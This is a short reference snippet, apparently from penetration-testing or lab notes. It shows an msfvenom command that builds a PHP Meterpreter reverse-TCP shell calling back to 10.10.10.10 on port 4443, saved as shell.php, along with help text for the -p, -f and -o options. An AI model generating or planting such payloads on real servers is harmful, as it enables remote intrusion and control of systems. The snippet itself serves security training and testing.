`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php`

-p, --payload [payload]  Payload to use. Specify a '-' or stdin to use custom payloads


-f, --format  [format]
              Output format (use --help-formats for a list)


-o, --out  [path]
              Save the payload


